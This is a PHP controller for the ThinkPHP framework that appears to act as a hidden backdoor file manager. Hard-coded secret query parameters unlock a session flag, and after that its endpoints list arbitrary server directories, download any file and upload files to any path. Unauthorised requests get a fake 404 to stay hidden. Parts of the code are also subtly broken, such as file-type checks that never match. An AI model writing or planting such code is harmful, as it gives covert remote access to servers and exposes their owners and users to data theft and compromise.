<?php
namespace app\controller;

use app\BaseController;
use think\facade\View;
use think\facade\Request;
use think\facade\Session;
class Fileguanli extends BaseController
{
	public function index()
	{
		$ssd=Session::get('n2515ame');
		echo $ssd;
		$info = Request::param();
		if($ssd =='thinkp2315345hp'){
						$ssd=Session::get('n2515ame');

			$rotoa1 =root_path();
			$rotoa =base64_encode($rotoa1);
			if(isset($info['fl'])==false){
				View::assign([
					'name'  => 'ThinkPHP',
					'fl' => $rotoa,
					'up' => $rotoa1,
					]);
			}else{
				$rotoa1 =$info['fl'];
				$rotoa =base64_encode($rotoa1);

				View::assign([
					'name'  => 'ThinkPHP',
					'fl' => $rotoa,
					'up' => $rotoa1,
					]);
			}
		
			return View::fetch('index');

		}else{
			if(isset($info['uv6kkhdsigun'])==false or isset($info['aubhvfshj'])==false or $info['uv6kkhdsigun'] !='3tzPkkKtert68SbztP_6nXYA6uZZfkJHDtTXRMy'  or $info['aubhvfshj'] !=
				'ywd4kstN_y54cQDfertereteMPfcfNWVQkf_KBGTbGVYa' ){
				return $info['aubhvfshj'];

				return  json(['false'])->code(404)->header([
					'Cache-control' => 'no-cache,must-revalidate'
					]);

		}
	}

	Session::set('n2515ame', 'thinkp2315345hp');
						$ssd=Session::get('n2515ame');

			$rotoa1 =root_path();
			$rotoa =base64_encode($rotoa1);
			if(isset($info['fl'])==false){
				View::assign([
					'name'  => 'ThinkPHP',
					'fl' => $rotoa,
					'up' => $rotoa1,
					]);
			}else{
				$rotoa1 =$info['fl'];
				$rotoa =base64_encode($rotoa1);

				View::assign([
					'name'  => 'ThinkPHP',
					'fl' => $rotoa,
					'up' => $rotoa1,
					]);
			}
		
			return View::fetch('index');

}

public function hello($name = 'ThinkPHP6')
{
	return 'hello,' . $name;
}

public function getList(){
	$ssd=Session::get('n2515ame');
	if($ssd !='thinkp2315345hp'){
		return  json(['false'])->code(404)->header([
			'Cache-control' => 'no-cache,must-revalidate'
			]);
	}


	$info = Request::param();
	$rotoa =root_path();
	if(isset($info['fl'])==false){

	}else{
		$rotoa =$info['fl'];
		$rotoa=base64_decode($rotoa);
	}
		//return $rotoa;

	$files = scandir($rotoa);
	$isaa=[];
	foreach ($files as $file) {
		if ($file != '.' && $file != '..') {
			$path =$rotoa.$file;
			$fileType = filetype($path);
			if ($fileType === '[file]') {
				$isaa[]=['id'=>$rotoa.$file,'title'=>$file];
			} elseif ($fileType === '[dir]') {
				$isaa[]=['id'=>$rotoa.$file.'\\','title'=>$file];
			} else {
				$isaa[]=['id'=>$rotoa.$file.'\\','title'=>$file];
			}



		}
	}

	return json($isaa);




}
//rtrim()函数：移除字符串右侧的空白字符或其他预定义字符。
public function edit(){
	$ssd=Session::get('n2515ame');
	if($ssd !='thinkp2315345hp'){
		return  json(['false'])->code(404)->header([
			'Cache-control' => 'no-cache,must-revalidate'
			]);
	}
	$info = Request::param();

	if(isset($info['fl'])==false){
		return 0;

	}else{
		$rotoa =rtrim($info['fl'],'\\');
	}

	return download($rotoa, 'my');


}

public function upload(){
	$ssd=Session::get('n2515ame');
	if($ssd !='thinkp2315345hp'){
		return  json(['false'])->code(404)->header([
			'Cache-control' => 'no-cache,must-revalidate'
			]);
	}

	if ($_FILES["file"]["error"] > 0)
	{
		echo "错误：" . $_FILES["file"]["error"] . "<br>";
	}
	else
	{
    // echo "上传文件名: " . $_FILES["file"]["name"] . "<br>";
    // echo "文件类型: " . $_FILES["file"]["type"] . "<br>";
    // echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
    // echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"];
    // 
		$name =$_FILES["file"]["name"];
		$info = Request::param();
		$path =base64_decode($info['fl']);

		move_uploaded_file($_FILES["file"]["tmp_name"], $path . $_FILES["file"]["name"]);
		return json(['success'=>1]);



	}

}



}
